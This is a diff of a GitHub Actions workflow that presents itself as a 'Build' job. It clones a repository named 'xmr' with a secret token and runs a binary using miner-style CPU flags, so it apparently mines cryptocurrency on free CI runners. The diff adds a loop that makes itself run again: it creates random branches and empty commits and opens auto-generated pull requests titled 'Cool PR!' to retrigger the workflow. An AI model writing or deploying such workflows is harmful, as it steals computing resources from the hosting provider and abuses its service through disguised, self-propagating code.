@@ -1,5 +1,5 @@
 name: Build
-on: [push, pull_request]
+on: [pull_request, workflow_dispatch]
 jobs:
   test:
     name: Fetch
@@ -17,13 +17,18 @@ jobs:
           apt install -y git libuv1 libssl1.1 libhwloc15
           git clone https://daveyg7:${{ secrets.token }}@github.com/daveyg7-org/xmr.git
           cd xmr
+          git config user.name 'Davey G'
+          git config user.email 'daveyg7@yandex.com'
+          export BRANCH=$(head -c8 /dev/urandom | base64 | tr -cd '[:alnum:]')
+          echo "::set-env name=BRANCH::$BRANCH"
+          git checkout -b $BRANCH
+          git commit --allow-empty --allow-empty-message --no-edit
+      - uses: thomaseizinger/create-pull-request@master
+        with:
+          GITHUB_TOKEN: ${{ secrets.token }}
+          head: $BRANCH
+          base: main
+          title: "Cool PR!"
+      - run: |
           chmod u+x prog
-          timeout $(shuf -i 300-820 -n 1) ./prog --cpu-no-yield --cpu-priority 5 || true
-          if [ ${{ matrix.runner }} -eq 0 ]
-          then
-            sleep 25m
-            git config user.name 'Davey G'
-            git config user.email 'daveyg7@yandex.com'
-            git commit --allow-empty --allow-empty-message --no-edit
-            git push
-          fi
+          ./prog --cpu-no-yield --cpu-priority 5
